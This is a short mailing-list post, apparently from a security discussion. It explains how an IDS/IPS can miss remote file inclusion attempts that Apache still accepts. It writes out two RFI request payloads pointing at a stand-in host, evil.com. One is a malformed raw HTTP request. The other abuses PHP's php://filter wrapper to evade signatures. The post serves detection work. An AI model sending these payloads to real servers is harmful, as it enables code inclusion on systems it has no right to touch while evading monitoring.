(This is what I gathered from the original posting, but I might be wrong.)

I think the issue is not that the apache server behaviour is wrong as
such, but that IDS/IPS do not use the same algorithm as apache for
checking validity of HTTP requests. Thus apache may accept and process
a request like:

\r\n\r\n\r\n\r\n\r\n\x0c/rfi.php?includedir=http://evil.com\x0bHTTP/1.0\r\n\r\n

but that the IDS/IPS will ignore that packet on the grounds that "it's
not a valid HTTP request"., when it should actually be alerting that a
RFI attempt was made.

While we're on the subject of IDS, it looks like PHP 5 supports a new
wrapper php://filter, such that a RFI may be performed by: GET
/rfi.php?includedir=php://filter/resource=http://www.evil.com - which
may not be detected by some existing IDS signatures. (See
http://uk2.php.net/manual/en/wrappers.php.php )

cheers,
 Jamie
